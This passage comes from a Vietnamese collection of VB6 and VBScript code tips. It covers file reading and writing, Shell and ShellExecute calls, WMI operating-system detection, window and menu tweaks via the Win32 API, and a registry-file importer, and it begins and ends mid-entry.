Nó sẽ trả về: Nha6m Ngo5//Bi1nh Thi2n//Ma65u Ty1//Canh Ty1//7/3/2008//0

Dịch nghĩa: (vui lòng dùng kèm hàm chuyển VNI2UNI để chuyển thành unicode)
-Giờ Canh Tý
-Ngày Nhâm Ngọ
-Tháng Bính Thìn
-Năm Mậu Tý
-Ngày âm: 7/3/2008
-Tham số cuối cùng: nếu = 1 thì tháng đó là tháng nhuần

Tự đánh giá: sử dụng tốt, tuy nhiên không đánh giá được độ chính xác và tầm thời gian hiệu lực đúng là từ năm nào đến năm nào.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080224090259</MaVD>
    <NoiDung>Private Function Edit1dòng(FileName As String, n As Long, dòng As String)
Dim a As Object: Dim b$: Dim i%: i = 1
Set a = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 1, , -2)
Do Until a.AtEndOfStream
    If i = n Then
        b = b &amp; dòng &amp; vbCrLf
        a.SkipLine
    Else
        b = b &amp; a.ReadLine &amp; vbCrLf
    End If
    i = i + 1
Loop
Set a = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 2, , -1)
a.Write b
Set a = Nothing
End Function
 
Private Sub Form_Load()
Call Edit1dòng("C:\Mùa Thu Lá Bay.txt", 5, "Tôi Ði Giua~ Hoàng Hôn")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080424090436</MaVD>
    <NoiDung>Private Function Ðoc1dòng(FileName As String, n As Long) As String  'n là dòng thu' mây cân Ðoc
Dim a As Object: Dim i%: i = 1
Set a = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 1, , -2)
Do Until a.AtEndOfStream
    If i &lt; n Then a.SkipLine
    If i = n Then Ðoc1dòng = a.ReadLine
    If i &gt; n Then Exit Do
        i = i + 1
   Loop
End Function
 
Private Sub Form_Load()
MsgBox Ðoc1dòng("C:\Mùa Thu Lá Bay.txt", 5)
End Sub


Để đếm số dòng trong file, bạn viết "a.Line" ngay sau câu "Set a = Create..." Code như sau:
Set a = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 1, , -2)
   MsgBox a.Line</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080624090611</MaVD>
    <NoiDung>Bạn thêm một Command Button tên là Command1 rồi thêm vào Form code sau

Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As Any, ByVal lpWindowName As String) As Long
Private Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Private Sub Command1_Click()
Dim hwnd As Long
 hwnd = FindWindow("Shell_TrayWnd", vbNullString) ' Shell_TrayWnd là tên class của các cửa sổ gồm
'Desktop và Systemtray 
MsgBox hwnd
 If hwnd &lt;&gt; 0 Then
 SetParent hwnd, Me.hwnd
 Else
 'Không tìm được Handle của Desktop và Systemtray
 End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080824090805</MaVD>
    <NoiDung>Dim log$, i&amp;
 
Private Sub Command1_Click()
DelEmptyFolders ("c:\")
End Sub
 
Private Sub Form_Load()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
ShowSubFolders fso.GetFolder("c:\")
MsgBox "Empty Folders = " &amp; i
Text1 = Replace(log, ",", vbCrLf)
End Sub
 
Sub ShowSubFolders(Folder)
    For Each Subfolder In Folder.SubFolders
        If Subfolder.Size = 0 Then
            log = log &amp; Subfolder.path &amp; ","
            i = i + 1
        End If
        ShowSubFolders Subfolder
    Next
End Sub
Function DelEmptyFolders(Folder)
Dim path() As String, w&amp;
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
path = Split(log, ",")
For w = 0 To i - 1
fso.DeleteFolder (path(w))
Next
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081224091221</MaVD>
    <NoiDung>A- Lệnh gọi thi hành
A- 1) Lệnh Shell: tham khảo VBLib

* Gọi trình WinWord, Phải có path của WINWORD.EXE. Theo thói quen, có thể bỏ phần ".exe" Ví dụ:

aaa = Shell("D:\Office\Microsoft Office\Office10\WINWORD", 1)

* Gọi trình WinWord và mở file doc nào đó:

aaa = Shell("D:\Office\Microsoft Office\Office10\WINWORD  C:\MùaThu~1.doc", 1)

Lưu ý: tên file không được có space, ví dụ sau sẽ không chạy được:

NotRun = Shell("D:\Office\Microsoft Office\Office10\WINWORD.EXE" "C:\Mùa Thu Lá bay", 1)


* Ta có thể dùng trình văn bản để mở một file bất kỳ, đọc thấy toàn mã máy:

aaa = Shell("C:\Program Files\Windows NT\Accessories\wordpad  c:\windows\system32\calc.exe", 1)


* Khi Shell gọi một trình của MS Windows (ví dụ calc.exe) trong các thư mục gốc hay hệ thống (windows\ hay windows\system32), do khi khởi động, biến môi trường đã nộp vào bộ nhớ nên ta có thể bỏ qua đường dẫn, bất kể trên máy nào đó có cài winXP ở đâu!

aaa = Shell ("calc")

hoặc gọn hơn nữa

Shell "calc"

nguyên tắc gọn nầy cũng dùng với các trình khác:

Shell "D:\Office\Microsoft Office\Office10\WINWORD"
Shell "D:\Office\Microsoft Office\Office10\WINWORD  C:\MùaThu~1.doc"


A- 2) Lệnh ShellExecute: 
ShellExecute là tự chạy một yêu cầu, có thể là một file, hay một câu lệnh, VỚI ĐIỀU KIỆN LÀ FILE ĐÓ, HAY CÂU LỆNH ĐÓ ĐÃ ĐƯỢC KHAI BÁO TRONG WINDOWS LÀ MỞ VỚI TRÌNH NÀO
Vậy thì một file hay một câu lệnh chưa đăng ký "Open With" thì ShellExecute cũng vô tác dụng!

Vì lý do trên, ta nên cân nhắc khi gọi ShellExecute, ví dụ muốn xem nội dung một file không có đuôi mở rộng, ta chỉ cần gọi Shell để chạy Notepad hay Wordpad load file cần xem, tránh khai báo rườm rà không cần thiết.

Khai báo hàm API:

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Sub Form_Load()
ShellExecute Me.hwnd, vbNullString, "C:\Mùa Thu Lá Bay.doc", vbNullString, "C:\", 1
End Sub

Nhận xét: Tên file tự do

A- 3) VBScript
* Gọi một ứng dụng
Các dòng lệnh sau tương đương với các dòng lệnh của Shell:
Set objShell = CreateObject("Wscript.Shell")

objShell.Run "calc"
objShell.Run ("ping 10.0.0.2")
objShell.Run "WINWORD"
objShell.Run "EXCEL"

Nhận xét: Tốn một câu khai báo: "Set objShell =...", nhưng khi chạy các ứng dụng đã đăng ký, ví dụ WinWord thì khỏi khai path, khác với Shell
* Mở một file văn bản

Set objword = CreateObject("Word.Application").Documents.Open("C:\Mùa Thu Lá Bay.Doc", 1)


B- Lệnh mở và thao tác trên file với thao tác cơ bản là Đọc, Ghi. Trong bài viết nầy chỉ minh họa thao tác Đọc
B- 1) Lệnh Open: tham khảo VBLib

a- Chuyên mở file TXT
trích VBLib:

Private Sub Form_Load()
Dim TextLine
    Open "TESTFILE" For Input As #1' Mo file Ðê Ðoc.
        Do While Not EOF(1)
            Line Input #1, TextLine' Ðoc tung dòng gán vào biên TextLine
            Debug.Print TextLine' In ra màn hình
        Loop
    Close #1' Ðóng file.
End Sub


b- Đọc text Unicode
Code sau đây hoàn chỉnh hơn

Private Sub Form_Load()
Dim fNum As Long, B() As Byte, fp
    fp = "C:\Mùa Thu Lá Bay.txt"
    fNum = FreeFile()
    Open fp For Binary Access Read As #fNum
        ReDim B(LOF(fNum))
    Get #fNum, , B
    Close #fNum
 
    Dim arr, i As Integer, s As String
    arr = Split(B, vbCrLf)
     For i = 0 To UBound(arr)
            s = s &amp; arr(i) &amp; vbCrLf
     Next i
TextBox1 = s
End Sub


B- 2) VBScript cho TXT: Tham khảo thêm Mục Tip VB
Đọc bất kể mã unicode! quá gọn

Private Function ReadFileUni(FileName As String) As String
Dim FSO
   Set FSO = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 1, , -2)
   ReadFileUni = FSO.Readall
   Set FSO = Nothing
End Function
 
Private Sub Form_Load()
TextBox1 = ReadFileUni("C:\Mùa Thu Lá Bay.txt")
End Sub


B- 3) VBScript cho Doc (hoặc dưới nó như RTF, TXT): Tham khảo thêm Mục Tip VB

Private Sub Form_Load()
Set objWord = CreateObject("Word.Application")
objWord.ChangeFileOpenDirectory ("C:\")
objWord.FileDialog(1).Title = "Select the files"
 
If objWord.FileDialog(1).Show = -1 Then
    For Each objFile In objWord.FileDialog(1).SelectedItems
        Set objDoc = objWord.Documents.Open(objFile)
        objDoc.Range.Copy
    Next
End If
 
TextBox1.Paste
objWord.Quit
End Sub


Bổ sung: Đọc file txt từng dòng

Private Function ReadLineText(FileName As String) As String
Const ForReading = 1, ForWriting = 2, TriStateTrue = -2
Dim FSO:    Set FSO = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 1, False, -2)
   Do Until FSO.AtEndOfStream
    ReadLineText = ReadLineText &amp; FSO.ReadLine &amp; vbCrLf
   Loop
   Set FSO = Nothing
End Function
 
Private Sub Form_Load()
MsgBox ReadLineText("C:\Mùa Thu Lá Bay.txt")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081918091904</MaVD>
    <NoiDung>Private Sub Form_Load()
Dim fNum As Long, B() As Byte, fp
    fp = "C:\Mùa Thu Lá Bay.txt"
    fNum = FreeFile()
    Open fp For Binary Access Read As #fNum
        ReDim B(LOF(fNum))
    Get #fNum, , B
    Close #fNum
 
    Dim arr, i As Integer, s As String
    arr = Split(B, vbCrLf)
     For i = 0 To UBound(arr)
            s = s &amp; arr(i) &amp; vbCrLf
     Next i
TextBox1 = s
End Sub

Hoặc đọc file uni
Private Function ReadFileUni(FileName As String) As String
Dim FSO
   Set FSO = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 1, , -2)
   ReadFileUni = FSO.Readall
   Set FSO = Nothing
End Function
Hoặc ghi file uni
Private Function WriteFileUni(FileName As String, Unistr As String)
Dim FSO As Object    'tao 1 file mo'i rôi mo'i ghi vào
      Set FSO = CreateObject("Scripting.FileSystemObject").CreateTextFile(FileName, True)
      Set FSO = Nothing
      Set FSO = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 2, , -1)
          FSO.Write Unistr
      Set FSO = Nothing
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081524091554</MaVD>
    <NoiDung>Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Sub Form_Load()
Set objDialog = CreateObject("UserAccounts.CommonDialog")
objDialog.Filter = "Bitmap|*.bmp|All Files|*.*"
objDialog.Flags = &amp;H200
objDialog.FilterIndex = 1
objDialog.InitialDir = "c:\windows\system32"
intResult = objDialog.ShowOpen
 
If intResult = 0 Then
    End
Else
    ShellExecute Me.hwnd, vbNullString, objDialog.FileName, vbNullString, "C:\", 1
End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081824091816</MaVD>
    <NoiDung>msgbox GetOS 
 
Function GetOS() 
'WMI is required for this script to function 
Dim strComputer, strWMIOS 
'If you only want to use locally, remove the inputbox and make strComputer = "." 
strComputer = Inputbox("Vao ten may tinh mang hoac nhan Enter cho may tinh nay.") 
    If strComputer = "" then 
        strComputer = "." 
    End if 
 
Dim objWmiService : Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\"&amp; strComputer &amp; "\root\cimv2") 
Dim strOsQuery : strOsQuery = "Select * from Win32_OperatingSystem" 
Dim colOperatingSystems : Set colOperatingSystems = objWMIService.ExecQuery(strOsQuery) 
Dim objOs 
Dim strOsVer 
 
    For Each objOs in colOperatingSystems 
        strWmios = objOs.Caption &amp; " " &amp; objOs.Version 
    Next 
 
    Select Case True 
    'Add more info to the 98 and 95 to get the specific version. i.e. 98SE 95 a,b,or c 
        Case InStr(strWmiOS, "2000 Server") &gt; 1 : GetOS = "2KSRV" 
        Case InStr(strWmiOS, "2003, Standard") &gt; 1 : GetOS = "2K3SRV" 
        Case InStr(strWmiOS, "2003, Enterprise") &gt; 1 : GetOS = "2K3ENTSRV" 
       Case InStr(strWmiOS, "2000 Advanced Server") &gt; 1 : GetOS = "2KADVSRV" 
       Case InStr(strWmiOS, "Windows NT") &gt; 1 : GetOS = "NT4" 
       Case InStr(strWmiOS, "Windows 2000") &gt; 1 : GetOS = "W2K" 
       Case InStr(strWmiOS, "Windows XP") &gt; 1 : GetOS = "WXP" 
       Case Else : GetOS = "Unknown" 
    End Select 
End Function

Đây là một cách khác, chúng ta lợi dung lệnh ver của Dos để lấy tên phiên bản Windows. Bạn có thể test lệnh ver bằng cách:
Start-&gt;Run-&gt;cmd-&gt;ver

Function GetTheOS()
 ' Will work with most versions of WSH.
     Dim sResults, fFile
     Dim WshShell : Set WshShell = CreateObject("WScript.Shell")
     Dim FSO : Set FSO = CreateObject("Scripting.FileSystemObject")
     Dim sTemp : sTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
     Dim sTempFile : sTempFile = "c:\runresult.tmp"
     WshShell.Run "%comspec% /c ver &gt;" &amp; sTempFile, 0, True
 '  wscript.sleep 1000
 '  On error Resume Next
     Set fFile = FSO.OpenTextFile(sTempFile, FORREADING)
     sResults = fFile.ReadAll
     fFile.Close
     Fso.DeleteFile(sTempFile)
 
     Select Case True
         Case InStr(sResults, "Windows NT") &gt; 1 : GetTheOS = "NT4"
         Case InStr(sResults, "Windows 2000") &gt; 1 : GetTheOS = "W2K"
         Case InStr(sResults, "Windows XP") &gt; 1 : GetTheOS = "WXP"
         Case Else : GetTheOS = "Unknown"
     End Select
 End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082024092006</MaVD>
    <NoiDung>Đoạn code sau yêu cầu Word tìm file ảnh jpg.
Lưu ý: Chưa Test trên các phiên bản MSWord. Có thể không như ý muốn

dim objWord, a
Set objWord = CreateObject("Word.Application")
objWord.FileSearch.FileName = "*.jpg"
objWord.FileSearch.LookIn = "c:\windows"
objWord.FileSearch.SearchSubfolders = True
objWord.FileSearch.Execute
For Each objFile in objWord.FileSearch.FoundFiles
    a = a &amp; objFile &amp;  vbcrlf
Next
objWord.Quit
msgbox a</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082324092330</MaVD>
    <NoiDung>Private Declare Function SendMessageLong Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wmsg As Long, ByVal wpa As Long, ByVal lpa As Long) As Long
Public Property Let Xocombo(ByRef com1 As ComboBox, ByVal bstate As Boolean)
    SendMessageLong com1.hwnd, &amp;H155, Abs(bstate), 0
End Property
Public Property Get comboExtendededUI(ByRef com1 As ComboBox) As Boolean
    Xocombo = (SendMessageLong(com1.hwnd, &amp;H156, 0, 0) &lt;&gt; 0)
End Property
Private Sub Form_Load()
Xocombo(combo1) = True
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082424092442</MaVD>
    <NoiDung>Public Sub xoatextbox(frmClearMe As Form)
Dim txt As Control
 For Each txt In Me
  If TypeOf txt Is TextBox Then txt.Text = ""
' Thay "" bởi một đoạn văn bản thì tất cả các Textbox đều có văn bản đó
 Next
End Sub
Private Sub Form_Load()
xoatextbox Me
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082624092621</MaVD>
    <NoiDung>Code Form1

Option Explicit
Private Sub Form_Load()
    Me.Caption = ""
    ProcOld = SetWindowLong(hwnd, GWL_WNDPROC, AddressOf WindowProc)
End Sub
 
Private Sub Form_Unload(Cancel As Integer)
    Call SetWindowLong(hwnd, GWL_WNDPROC, ProcOld)
End Sub


Code Module1

Option Explicit
'' ChinDangShun - 01-2004. truongphu edit
Public ProcOld As Long
Public Const WM_NCPAINT = &amp;H85: Public Const WM_NCACTIVATE = &amp;H86: 'WM_CLEAR = &amp;H303 WM_ERASEBKGND = &amp;H14 WM_EXITSIZEMOVE = &amp;H232 WM_SETREDRAW = &amp;HB WM_SIZE = &amp;H5 WM_WINDOWPOSCHANGED = &amp;H47
Public Const TRANSPARENT As Long = 1: Public Const GWL_WNDPROC = (-4)
Declare Function SelectObject Lib "gdi32.dll" (ByVal hdc As Long, ByVal hObject As Long) As Long
Declare Function DeleteObject Lib "gdi32.dll" (ByVal hObject As Long) As Long
Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function GetWindowDC Lib "user32.dll" (ByVal hwnd As Long) As Long
Public Declare Function ReleaseDC Lib "user32.dll" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Public Declare Function SetBkMode Lib "gdi32.dll" (ByVal hdc As Long, ByVal nBkMode As Long) As Long
Public Declare Function SetTextColor Lib "gdi32.dll" (ByVal hdc As Long, ByVal crColor As Long) As Long
Public Declare Function TextOut Lib "gdi32.dll" Alias "TextOutW" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, lpString As Any, ByVal nCount As Long) As Long
'Các constant cho font chu~
'Const LF_FACESIZE = 32 DEFAULT_CHARSET = 1 ANSI_CHARSET = 0 DEFAULT_QUALITY = 0 PROOF_QUALITY = 2 DEFAULT_PITCH = 0 Const FIXED_PITCH = 1 CLIP_LH_ANGLES = 16 CLIP_DEFAULT_PRECIS = 0 CLIP_STROKE_PRECIS = 2
'OUT_DEFAULT_PRECIS = 0 OUT_TT_ONLY_PRECIS = 7 TRUETYPE_FONTTYPE = &amp;H4 FF_MODERN = 48 FF_DONTCARE = 0 FF_DECORATIVE = 80 FF_ROMAN = 16 FF_SCRIPT = 64 FF_SWISS = 32
Public Const FW_BOLD = 700: Public hFont As Long, Old_hFont As Long
Public Type LOGFONT
    lfHeight As Long: lfWidth As Long: lfEscapement As Long:  lfOrientation As Long: lfWeight As Long: lfItalic As Byte: lfUnderline As Byte
    lfStrikeOut As Byte: lfCharSet As Byte: lfOutPrecision As Byte: lfClipPrecision As Byte: lfQuality As Byte: lfPitchAndFamily As Byte: lfFaceName(32) As Byte
End Type
 
Public Declare Function CreateFontIndirect Lib "gdi32.dll" Alias "CreateFontIndirectA" (lpLogFont As LOGFONT) As Long
Public Type Unicode
    H As Byte:  l As Byte
End Type
 
Private Sub SetUnicodeTitlebar()
    Dim NC_hDC As Long, Result As Long, Lf As LOGFONT, NewCaption() As Unicode
    Dim FontFace As String, NewFontFace() As Byte, Seed As Integer
    NC_hDC = GetWindowDC(Form1.hwnd)
    Lf.lfWeight = FW_BOLD:    FontFace = "Tahoma":    NewFontFace = StrConv(FontFace, vbFromUnicode)
    For Seed = 1 To Len(FontFace)
        Lf.lfFaceName(Seed - 1) = NewFontFace(Seed - 1)
    Next Seed
 
    hFont = CreateFontIndirect(Lf)
    Old_hFont = SelectObject(NC_hDC, hFont)
    Result = SetTextColor(NC_hDC, &amp;HFFFFFF):     Result = SetBkMode(NC_hDC, TRANSPARENT)
    ' Gán vào biên NewCaption và chuyên nó ra Bytes-Array !!!
    NewCaption = UniStr2BytesArray("Ti" &amp; ChrW(7871) &amp; "ng Vi" &amp; ChrW(7879) &amp; "t")
    Result = TextOut(NC_hDC, 24, 6, NewCaption(0), UBound(NewCaption))
    Result = SelectObject(NC_hDC, Old_hFont):  Result = DeleteObject(hFont):  Result = ReleaseDC(Form1.hwnd, NC_hDC)
End Sub
 
Public Function WindowProc(ByVal hwnd As Long, ByVal iMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    WindowProc = CallWindowProc(ProcOld, hwnd, iMsg, wParam, lParam)
    Select Case iMsg
        Case WM_NCACTIVATE:    SetUnicodeTitlebar
        Case WM_NCPAINT:       SetUnicodeTitlebar
    End Select
End Function
Function UniStr2BytesArray(SrcStr As String) As Unicode()
    Dim SrcStrLength As Long, Seed As Long, TmpUnicode() As Unicode
    SrcStrLength = LenB(SrcStr)
    ReDim TmpUnicode(SrcStrLength / 2)
        Seed = 0
    Do Until Seed &gt;= SrcStrLength / 2
        TmpUnicode(Seed).H = CByte(AscB(MidB(SrcStr, Seed * 2 + 1, 1)))
        TmpUnicode(Seed).l = CByte(AscB(MidB(SrcStr, Seed * 2 + 2, 1)))
        Seed = Seed + 1
    Loop
        UniStr2BytesArray = TmpUnicode
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082924092907</MaVD>
    <NoiDung>Võ Quang Hòa
Private Declare Function OpenProcess Lib "Kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetExitCodeProcess Lib "Kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Sub Sleep Lib "Kernel32" (ByVal dwMilliseconds As Long)
Sub Shell32Bit(ByVal fullpath As String)
         Dim hProcess As Long
         Dim RetVal As Long
         hProcess = OpenProcess(&amp;H400, False, Shell(fullpath, 1))
         Do
             GetExitCodeProcess hProcess, RetVal
             DoEvents: Sleep 100
         Loop While RetVal = &amp;H103
End Sub
Private Sub Form_Load()
Shell32Bit "D:\GAMES\crates2.exe"
msgbox " Nó đã dừng lại"
End Sub

T7
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "D:\games\freecell", , True
MsgBox "freecell closed !"

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083024093024</MaVD>
    <NoiDung>Private Type POINTAPI  'Khai loai biên cho con tro
        X As Long
        Y As Long
End Type
 
'Khai hàm API nhân toa Ðô con tro
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
 
'Viêt môt hàm chung cho các controls
Private Function MV(Button As Integer, FRM As Form, CTL As Control)
If Button Then  'Nêu button còn nhân thì
Dim ViTri As POINTAPI
GetCursorPos ViTri
CTL.Top = (ViTri.Y * Screen.TwipsPerPixelY - FRM.Top - 500)
CTL.Left = (ViTri.X * Screen.TwipsPerPixelX - FRM.Left - 900)
End If
End Function
 
'''''''''''''''U'ng dung cho các Control ''''''''''''''''''''''''''''''
Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
MV Button, Form1, Command1
End Sub
 
Private Sub Image1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
MV Button, Form1, Image1
End Sub
 
Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
MV Button, Form1, Label1
End Sub
 
Private Sub List1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
MV Button, Form1, List1
End Sub
 
Private Sub Text1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
MV Button, Form1, Text1
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083224093204</MaVD>
    <NoiDung>Thêm vào trong một Module

Private Declare Function FindWindow Lib "user32" Alias _
   "FindWindowA" (ByVal lpClassName As String, _
   ByVal lpWindowName As String) As Long
 
Private Declare Function FindWindowEx Lib "user32" Alias _
  "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, _
   ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
   
Public Declare Function SetTimer&amp; Lib "user32" _
  (ByVal hwnd&amp;, ByVal nIDEvent&amp;, ByVal uElapse&amp;, ByVal _
   lpTimerFunc&amp;)
 
Private Declare Function KillTimer&amp; Lib "user32" _
  (ByVal hwnd&amp;, ByVal nIDEvent&amp;)
 
Private Declare Function SendMessage Lib "user32" Alias _
    "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, _
    ByVal wParam As Long, lParam As Any) As Long
 
Const EM_SETPASSWORDCHAR = &amp;HCC
Public Const NV_INPUTBOX As Long = &amp;H5000&amp;
 
Public Sub TimerProc(ByVal hwnd&amp;, ByVal uMsg&amp;, _
   ByVal idEvent&amp;, ByVal dwTime&amp;)
 
    Dim EditHwnd As Long
 
' CHANGE APP.TITLE TO YOUR INPUT BOX TITLE.
 
    EditHwnd = FindWindowEx(FindWindow("#32770", App.Title), _
       0, "Edit", "")
 
    Call SendMessage(EditHwnd, EM_SETPASSWORDCHAR, Asc("*"), 0)
    KillTimer hwnd, idEvent
End Sub
 

Và sử dụng trong Form(thêm vào nột Command nhé)

Private Sub Command1_Click()
  Dim ret As String
  SetTimer hwnd, NV_INPUTBOX, 10, AddressOf TimerProc
  ret = InputBox("Enter Password")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083424093404</MaVD>
    <NoiDung>Để giải quyết vấn đề này, chúng ta khai báo mới 1 form nữa, canh nó nằm giữa và show hộp thoại dialog là xong:

Private Sub Command1_Click()
    Dim frm As New Form1
    frm.Move (Screen.Width - frm.Width) / 2, (Screen.Height - frm.Height) / 2
    frm.CommonDialog1.ShowColor
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083524093534</MaVD>
    <NoiDung>Option Explicit
 
Private Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Private Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Private Declare Function DestroyMenu Lib "user32" (ByVal hMenu As Long) As Long
Private Const MF_BYPOSITION = &amp;H400&amp;
Private Declare Function GetSystemMenu Lib "user32" (ByVal hWnd As Long, ByVal bRevert As Long) As Long
Private Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
 
Function DeleteMenuString(hWnd As Long, Item As String) As Long 'hWnd la handle cua cua~ so chua menu, item la` ten cua item trong menu
    Dim hMenu As Long, str As String, iCount As Integer, i As Integer
    str = Space(Len(Item))
    hMenu = GetSystemMenu(hWnd, 0&amp;)
    iCount = GetMenuItemCount(hMenu)
    For i = 0 To iCount - 1
        GetMenuString hMenu, i, str, 10, MF_BYPOSITION
        If str = Item Then
            DeleteMenu hMenu, i, MF_BYPOSITION
            Exit For
        End If
    Next i
End Function
 
Private Sub Form_Load()
    DeleteMenuString Me.hWnd, "&amp;Close"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083824093852</MaVD>
    <NoiDung>Bạn thêm vào 3 cái form (tên mặc định form1, form2, form3).Vào Project &gt;Project1 properties &gt; Startup project &gt; chọn form3 rồi thêm code sau đây vào form3

Private Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Private Sub Form_Load()
SetParent Form1.hWnd, Form2.hWnd
SetParent Form2.hWnd, Form3.hWnd
Form1.Show
Form2.Show
Form1.Move 0, 0
Form2.Move 100, 100
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083924093942</MaVD>
    <NoiDung>Private Sub Form_Load()
Const wshYes = 6
Const wshNo = 7
Const wshYesNoDialog = 4
Const wshQuestionMark = 32
 
Set objShell = CreateObject("Wscript.Shell")
 
intReturn = objShell.Popup("Do you want to delete this file?", _
    3, "Only 3 seconds to do this", wshYesNoDialog + wshQuestionMark)
If intReturn = wshYes Then
    MsgBox "You clicked the Yes button."
ElseIf intReturn = wshNo Then
    MsgBox "You clicked the No button."
Else
    MsgBox "The popup timed out."
End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084424094420</MaVD>
    <NoiDung>'Source: wwww.pscode.com
'Editor: Tran Dai Nghia
'Email: gianghoplus@yahoo.com
'Website: http://giangho.biz
 
Public Function ImportRegFromFile!(RegFilePath$)
 
    On Error GoTo ImportRegError
 
    If Dir(RegFilePath) = "" Then GoTo ImportRegError
 
    Dim CurrentLine$, Reg$
 
    Open RegFilePath For Input As #1
        While Not EOF(1)
            Line Input #1, CurrentLine
            If Len(CurrentLine) &gt; 1 Then Reg = Reg + CurrentLine + vbNewLine
        Wend
    Close #1
    'Debug.Print Reg
 
    Dim RegObject As Object
    Dim RegPathArray$(), RegLineArray$(), RegComponentsArray$()
    Dim RegPath$, RegKey$, RegType$, RegValue
    Dim i%, j%, k%
 
    Set RegObject = CreateObject("Wscript.Shell")
    RegPathArray = Split(Reg, vbNewLine + Chr(91))
    For i = 1 To UBound(RegPathArray)
        RegLineArray = Split(RegPathArray(i), vbNewLine + Chr(34))
        RegPath = Mid(RegLineArray(0), 1, Len(RegLineArray(0)) - 1)
        For j = 1 To UBound(RegLineArray)
            RegComponentsArray = Split(RegLineArray(j), Chr(34) + Chr(61))
            RegKey = RegComponentsArray(0)
            RegComponentsArray = Split(RegComponentsArray(1), Chr(34))
            If UBound(RegComponentsArray) = 2 Then RegComponentsArray(0) = "sz" + Chr(58) + RegComponentsArray(1)
            RegComponentsArray = Split(RegComponentsArray(0), Chr(58))
            If UBound(RegComponentsArray) &gt; 1 Then
                For k = 2 To UBound(RegComponentsArray)
                    RegComponentsArray(1) = RegComponentsArray(1) + Chr(58) + RegComponentsArray(k)
                Next k
            End If
            Select Case UCase(RegComponentsArray(0))
                Case "SZ"
                    RegType = "REG_SZ"
                    RegValue = Replace(RegComponentsArray(1), Chr(92) + Chr(92), Chr(92))
                Case "DWORD"
                    RegType = "REG_DWORD"
                    RegValue = Val(RegComponentsArray(1))
                Case Else
                    'Here can be filled for unsupported types
            End Select
            Call RegObject.RegWrite(RegPath + Chr(92) + RegKey, RegValue, RegType)
            'Debug.Print RegPath
            'Debug.Print RegKey, RegValue, RegType
        Next j
    Next i
    ImportRegFromFile = True
